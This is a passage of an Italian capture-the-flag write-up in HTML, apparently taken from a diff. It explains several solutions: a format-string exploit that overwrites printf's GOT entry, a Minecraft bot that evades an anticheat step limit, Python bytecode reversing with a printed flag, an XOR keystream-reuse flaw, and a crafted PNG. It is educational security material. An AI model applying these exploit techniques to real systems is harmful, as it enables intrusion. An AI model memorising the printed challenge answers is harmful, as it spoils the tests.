+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">printf</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">win</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Ottieni la flag!</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="riepilogo">Riepilogo<a hidden class="anchor" aria-hidden="true" href="#riepilogo">#</a></h4>
+<ul>
+<li>La vulnerabilità è un classico format string bug dovuto a una <code>printf</code> insicura.</li>
+<li>Usiamo il leak dell’indirizzo di <code>main</code> per battere PIE.</li>
+<li>Sovrascriviamo la voce GOT di <code>printf</code> con l’indirizzo di <code>win()</code>.</li>
+<li>Alla successiva <code>printf</code>, l’esecuzione salta a <code>win()</code> e otteniamo la flag.</li>
+</ul>
+<h3 id="minecrafty">Minecrafty<a hidden class="anchor" aria-hidden="true" href="#minecrafty">#</a></h3>
+<p>Questa challenge include un <strong>server Minecraft in Go</strong> personalizzato (modifica di <code>go-mc/server</code>) e un file di “hint”, <strong><code>message.txt</code></strong>, contenente un bot Node.js che parla il protocollo di Minecraft. L’obiettivo era far sì che il server stampasse la flag in chat.</p>
+<p>Idea di base: il comando chat <strong><code>!flag</code></strong> verifica le tue coordinate <strong>esatte</strong> XYZ e restituisce la flag reale solo se stai in <strong>(69420, 69420, 69420)</strong>. Il movimento è rate-limited, ma non abbastanza da impedire a un bot di camminare lì a piccoli passi.</p>
+<h4 id="cosa-cè-di-interessante-nel-server">Cosa c’è di interessante nel server<a hidden class="anchor" aria-hidden="true" href="#cosa-cè-di-interessante-nel-server">#</a></h4>
+<p><strong>1. Il gate del comando chat</strong></p>
+<p>In <code>server/game/chat.go</code>, il server ispeziona la chat in ingresso. Quando il messaggio è <code>!flag</code>, legge la <code>Position</code> corrente del player e la confronta con <code>(69420, 69420, 69420)</code>. Se non sei lì, ti trolla con un decoy:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">switch</span><span class="w"> </span><span class="nb">string</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">case</span><span class="w"> </span><span class="s">&#34;!flag&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">int32</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">y</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">int32</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">z</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">int32</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">69420</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">69420</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">69420</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nx">c</span><span class="p">.</span><span class="nf">SendPlayerChat</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nx">player</span><span class="p">.</span><span class="nx">UUID</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">signature</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedMessageBody</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">PlainMsg</span><span class="p">:</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;ctf{try_harder}  Your Position: %d %d %d  Expected Position: 69420 69420 69420&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">y</span><span class="p">,</span><span class="w"> </span><span class="nx">z</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">Timestamp</span><span class="p">:</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">Salt</span><span class="p">:</span><span class="w"> </span><span class="nb">int64</span><span class="p">(</span><span class="nx">salt</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">LastSeen</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedSignature</span><span class="p">{},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">FilterMask</span><span class="p">{</span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">chatType</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nx">c</span><span class="p">.</span><span class="nf">SendPlayerChat</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nx">player</span><span class="p">.</span><span class="nx">UUID</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">signature</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedMessageBody</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">PlainMsg</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ctf{redacted}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">Timestamp</span><span class="p">:</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">Salt</span><span class="p">:</span><span class="w"> </span><span class="nb">int64</span><span class="p">(</span><span class="nx">salt</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">LastSeen</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedSignature</span><span class="p">{},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">FilterMask</span><span class="p">{</span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">chatType</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>2. La soglia dell’anticheat</strong></p>
+<p>In <code>server/world/tick.go</code>, il server controlla quanto ti sei mosso tra due update. Se un singolo step è <strong>oltre 100 blocchi</strong>, ti teletrasporta indietro (classico “moved too quickly”). Qualsiasi cosa <strong>≤ 100</strong> viene accettata:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">delta</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="kt">float64</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nx">distance</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">math</span><span class="p">.</span><span class="nf">Sqrt</span><span class="p">(</span><span class="nx">delta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="nx">delta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">delta</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="nx">delta</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">delta</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="nx">delta</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="nx">distance</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">teleportID</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nf">SendPlayerPosition</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Rotation</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">teleport</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">TeleportRequest</span><span class="p">{</span><span class="w"> </span><span class="nx">ID</span><span class="p">:</span><span class="w"> </span><span class="nx">teleportID</span><span class="p">,</span><span class="w"> </span><span class="nx">Position</span><span class="p">:</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">,</span><span class="w"> </span><span class="nx">Rotation</span><span class="p">:</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Rotation</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">.</span><span class="nf">IsValid</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">pos0</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">rot0</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Rotation</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">OnGround</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">OnGround</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>3. Offline mode</strong></p>
+<p>Il <code>server/config.toml</code> incluso abilita gli accessi offline:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="nx">online-mode</span> <span class="p">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="nx">enforce-secure-profile</span> <span class="p">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="nx">listen-address</span> <span class="p">=</span> <span class="s2">&#34;0.0.0.0:25565&#34;</span>
+</span></span></code></pre></div><p>Per questo un semplice bot “protocol” può connettersi con <code>auth: 'offline'</code>.</p>
+<h4 id="soluzione">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione">#</a></h4>
+<p>Dato quanto sopra, risolvere si riduce a:</p>
+<ol>
+<li><strong>Connettersi in offline mode</strong> al server.</li>
+<li><strong>Camminare</strong> fino a <code>(69420, 69420, 69420)</code> usando hop <strong>≤ 100 blocchi</strong> per update così che il server accetti la posizione.</li>
+<li><strong>Inviare <code>!flag</code></strong> e catturare qualunque chat che contenga <code>ctf{</code>.</li>
+</ol>
+<p>Il <code>message.txt</code> fornito include già un exploit Node funzionante con <strong>mineflayer</strong> e <strong>vec3</strong> che fa esattamente questo: connette offline, avanza verso la destinazione con un limite per-step (conservativo <strong>50</strong> ≤ 100), poi invia <code>!flag</code> e stampa ogni chat contenente <code>ctf{</code>.</p>
+<p>Uso minimale (dall’header dell’exploit):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">npm i mineflayer vec3
+</span></span><span class="line"><span class="cl">node exploit_flag.js --host &lt;SERVER_IP&gt; --port <span class="m">25565</span> --name Flaggy
+</span></span></code></pre></div><p>Idee chiave nel bot:</p>
+<ul>
+<li><strong>Passi limitati</strong> per bypassare il check &gt;100:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">MAX_STEP</span> <span class="o">=</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">stepTowards</span><span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">dst</span><span class="p">,</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dx</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">dy</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">dz</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">hypot</span><span class="p">(</span><span class="nx">dx</span><span class="p">,</span> <span class="nx">dy</span><span class="p">,</span> <span class="nx">dz</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nx">cur</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">&lt;=</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="k">return</span> <span class="nx">dst</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">maxStep</span> <span class="o">/</span> <span class="nx">dist</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">cur</span><span class="p">.</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">dx</span><span class="o">*</span><span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span> <span class="o">+</span> <span class="nx">dy</span><span class="o">*</span><span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">dz</span><span class="o">*</span><span class="nx">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li><strong>Pacchetti di posizione raw</strong> ogni ~200 ms per aggiornare la posizione senza pathfinding.</li>
+<li>All’arrivo, <strong>invia <code>!flag</code></strong> e <strong>greppa la chat</strong> per <code>ctf{</code>.</li>
+</ul>
+<p>Una volta posizionato <strong>esattamente</strong> a <code>(69420, 69420, 69420)</code>, l’handler del <code>!flag</code> prende il ramo <code>else</code> e risponde con la flag reale in chat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env node
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span><span class="kr">const</span> <span class="nx">mineflayer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mineflayer&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">Vec3</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vec3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* ... (codice invariato come nell’originale) ... */</span>
+</span></span></code></pre></div><h2 id="reverse-engineering-">Reverse engineering ⚙️<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-">#</a></h2>
+<h3 id="pythonese">Pythonese<a hidden class="anchor" aria-hidden="true" href="#pythonese">#</a></h3>
+<p>Questa challenge forniva un dump di <strong>bytecode Python</strong> grezzo e chiedeva di recuperare la flag prodotta a runtime.</p>
+<p>A prima vista, il file importa molti moduli (<code>hashlib</code>, <code>base64</code>, <code>marshal</code>, <code>asyncio</code>, ecc.) e riempie <code>__doc__</code>/<code>__annotations__</code> con Base64 casuale per fare rumore. C’è anche un anti-RE che cerca moduli di reverse engineering e debugger. Ignoriamo quelle parti e ci concentriamo sul control flow.</p>
+<p>Mappando le funzioni (<code>f0...f16</code>), vediamo che l’entrypoint (<code>f16</code>) legge una stringa di input <code>i</code>, costruisce una piccola “VM” (via <code>compile</code> + <code>marshal</code>) che espone <code>run(...)</code>, e poi <strong>stampa il valore di ritorno di <code>run(...)</code></strong>. Il punto cruciale è come <code>run</code> è costruita in <code>f15</code>: incapsula una stringa costante <code>r</code> composta da <code>f13</code>, quindi la flag stampata è interamente determinata da <code>f13</code>.</p>
+<p>Dentro <code>f13</code> troviamo due interi derivati dall’input:</p>
+<ul>
+<li><code>k1 = int(i[:4])</code></li>
+<li><code>k2 = int(i[4:6])</code></li>
+</ul>
+<p>Un helper annidato (<code>fvdy</code>) decodifica poi diverse array di interi (concettualmente <code>a, b, c, d, e, f, g, h, i</code>) in caratteri usando questa trasformazione per elemento:</p>
+<pre tabindex="0"><code>ch = chr( (((v &gt;&gt; 1) + k2) ^ (k1 &amp; 0xFF)) &amp; 0xFF )
+</code></pre><p>Una volta decodificate le array, <code>f13</code> assembla la stringa finale <code>r</code> come:</p>
+<ol>
+<li>la decodifica di <code>a</code> (usata come <strong>prefisso</strong>),</li>
+<li>le altre parti riordinate da una permutazione fissa <code>P = (3, 6, 1, 7, 0, 5, 2, 4)</code>,</li>
+<li>un singolo carattere <strong>suffisso</strong>.</li>
+</ol>
+<p>Per risolvere, imponiamo il prefisso naturale <code>a == &quot;CTF{&quot;</code> e risolviamo le congruenze lineari (mod 256) sui primi caratteri di <code>a</code>. Questo inchioda:</p>
+<ul>
+<li><code>k1 ≡ 81 (mod 256)</code> (qualunque <code>k1</code> a 4 cifre che dia <code>81</code> modulo 256 va bene, es. <code>1105</code>)</li>
+<li><code>k2 = 83</code></li>
+</ul>
+<p>Con <code>k1, k2</code> fissati, decodificando e assemblando <code>a + parti_permutate + suffisso</code> si ottiene l’intera flag. Qualsiasi input le cui prime 6 cifre soddisfano quei vincoli fa stampare la flag (es. <code>110583...</code>; il resto non importa).</p>
+<h4 id="flag">Flag<a hidden class="anchor" aria-hidden="true" href="#flag">#</a></h4>
+<pre tabindex="0"><code>CTF{2944cec0c0f401a5fa538933a2f6210c279fbfc8548ca8ab912b493d03d2f5bf}
+</code></pre><h3 id="ironevil">Ironevil<a hidden class="anchor" aria-hidden="true" href="#ironevil">#</a></h3>
+<h4 id="la-challenge">La challenge<a hidden class="anchor" aria-hidden="true" href="#la-challenge">#</a></h4>
+<p>Il binario fornito nella challenge, chiamato <code>ironveil</code>, è un eseguibile ELF 64-bit PIE compilato per Linux e collegato a un loader NixOS. Poiché il percorso dell’interprete indicato nel binario punta a una posizione non standard, il programma non può essere eseguito direttamente su un sistema tipico. È per questo che, lanciandolo da shell, compare l’errore “cannot execute: required file not found.” In pratica, la soluzione è specificare manualmente il loader del sistema, di solito <code>/lib64/ld-linux-x86-64.so.2</code>, per poter eseguire il programma.</p>
+<p>Il codice decompilato mostra che, prima di qualsiasi operazione di cifratura, il programma dedica molto tempo all’inizializzazione. Imposta gestori di segnali, esegue controlli con <code>poll</code> sui descrittori di file e interagisce con <code>/dev/null</code>. Inoltre interroga attributi dei thread, come indirizzo e dimensione dello stack, e li riallinea con precisione. Queste procedure sono tipiche di binari resi più resistenti a tecniche di debugging o all’esecuzione in sandbox. Una volta completata l’inizializzazione, però, la logica si riduce a un comportamento piuttosto semplice: il programma si aspetta un file come input e produce un output cifrato con il suffisso <code>.encrypted</code>.</p>
+<p>La routine di cifratura è basata su una macchina virtuale personalizzata. Questa VM interpreta trentadue opcode per generare uno stream di byte che funge da chiave. Lo stream viene poi applicato al file in input con un’operazione di XOR byte per byte. Ogni byte di plaintext viene combinato con il corrispondente byte della chiave e il risultato viene scritto su disco. Il dettaglio cruciale è che la VM è deterministica: lo stesso binario produce sempre lo stesso keystream. Non esiste alcun seed casuale, nonce o variazione per file. Ciò significa che la trasformazione è semplicemente <code>ciphertext = plaintext ⊕ key</code>. Applicare la trasformazione due volte con la stessa chiave la annulla, perché <code>(P ⊕ K) ⊕ K = P</code>.</p>
+<h4 id="la-soluzione-1">La soluzione<a hidden class="anchor" aria-hidden="true" href="#la-soluzione-1">#</a></h4>
+<p>La challenge ci metteva a disposizione soltanto il binario e un file già cifrato, <code>flag.txt.encrypted</code>. La soluzione pensata dagli autori probabilmente era quella di invertire la VM, studiarne le trentadue istruzioni e rigenerare lo stream di chiave per decifrare manualmente il ciphertext. Tuttavia, la natura deterministica dell’algoritmo offriva una via molto più semplice. Dando in pasto al programma il file già cifrato, lo stesso keystream veniva applicato di nuovo. Di conseguenza, la doppia cifratura si annullava e restituiva il plaintext originale.</p>
+<p>Eseguendo il binario tramite il loader di sistema con il file cifrato come input veniva generato un nuovo file, <code>flag.txt.encrypted.encrypted</code>. Aprendolo si poteva vedere immediatamente la flag in chiaro all’inizio del file. Il resto conteneva byte spazzatura, coerenti con l’operazione XOR che prosegue oltre la flag su dati inutilizzati o irrilevanti. Ma la presenza della flag completa all’inizio era sufficiente per risolvere la challenge.</p>
+<h4 id="note-finali">Note finali<a hidden class="anchor" aria-hidden="true" href="#note-finali">#</a></h4>
+<p>La debolezza di sicurezza qui risiede proprio nel riutilizzo di uno stream di chiave statico. Nella crittografia reale, i cifrari a flusso sono sicuri solo se ogni cifratura usa un nonce o un vettore di inizializzazione univoco, così da garantire che lo stream non si ripeta mai. In assenza di questa misura, il cifrario si riduce a un insicuro “many-time pad”, in cui l’uso ripetuto dello stesso keystream porta inevitabilmente a perdite di informazione. In questo caso, la falla era talmente grave che una semplice doppia esecuzione del binario invertiva la trasformazione ed esponeva direttamente la flag in chiaro.</p>
+<p>La challenge quindi poteva essere risolta in pochi secondi senza comprendere affatto il funzionamento della macchina virtuale, semplicemente ri-cifrando il ciphertext fornito. Il risultato inatteso ma valido è stato il recupero della flag:</p>
+<h3 id="pixel-gate">Pixel Gate<a hidden class="anchor" aria-hidden="true" href="#pixel-gate">#</a></h3>
+<p>Questa challenge includeva un eseguibile Go <code>challenge</code> strip-pato e uno script helper <code>gen.py</code>. Il binario si aspetta un PNG con un formato molto specifico e stampa i contenuti solo se tutte le validazioni interne vanno a buon fine. Facendo reverse del build Go RISC-V64 troviamo un parser PNG volutamente minimale e fatto a mano, i cui vincoli sono rispecchiati esattamente dallo script generatore.</p>
+<h4 id="lalgoritmo">L’algoritmo<a hidden class="anchor" aria-hidden="true" href="#lalgoritmo">#</a></h4>
+<p>Il file deve iniziare con la firma PNG a 8 byte. Subito dopo, un chunk <code>IHDR</code> con payload di 13 byte che codifica ampiezza 1337, altezza 1, bit depth 8 e color type 2 (truecolor), mentre i byte di compressione, filtro e interlacciamento sono tutti zero. (Il path ammette anche color type 6, ma lo script usa 2 per semplicità.) Ogni chunk subisce la verifica CRC32 standard calcolata su <code>type || data</code>. Dopo <code>IHDR</code>, il programma si aspetta un chunk <code>tEXt</code> i cui dati sono divisi sul primo NUL: una key da 15 byte seguita da un value da 17 byte. Questi vengono confrontati byte-per-byte con costanti embeddate: key <code>6ee494848e978ea</code> e value <code>d50bc687e6e14f8f8</code>. Deve apparire anche un chunk ancillare personalizzato <code>raRE</code> con payload di 18 byte uguale (come ASCII raw, non decodificato) a <code>2b6b2c6ba2912d219d</code>. È richiesto almeno un <code>IDAT</code> ma il contenuto non viene mai decompresso; è accettato vuoto perché si controllano solo presenza e CRC. Infine un <code>IEND</code> chiude lo stream. Internamente il parser mantiene flag per: firma valida, <code>IHDR</code> ok, coppia key/value corretta, payload <code>raRE</code> corretto, visto almeno un <code>IDAT</code>, e <code>IEND</code> incontrato. Solo se tutti sono veri il programma riapre il file e dumpa i byte grezzi su stdout.</p>
+<h4 id="soluzione-1">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-1">#</a></h4>
+<p>Ricostruire un file valido si riduce a un’assemblaggio lineare: emettere la firma PNG, costruire l’<code>IHDR</code> esatto, forgiare i byte del <code>tEXt</code> come key + NUL + value, aggiungere il payload fisso <code>raRE</code>, includere un <code>IDAT</code> vuoto, e chiudere con <code>IEND</code>, assicurandosi che ogni CRC32(type||data) corrisponda. L’ordine usato dall’helper—IHDR → tEXt → raRE → IDAT → IEND—soddisfa le dipendenze e mantiene l’immagine minimale.</p>
+<p>Lo <code>gen.py</code> automatizza questi passi e scrive <code>pass.png</code>:</p>
+<h5 id="generatore-png-in-python">Generatore PNG in Python<a hidden class="anchor" aria-hidden="true" href="#generatore-png-in-python">#</a></h5>
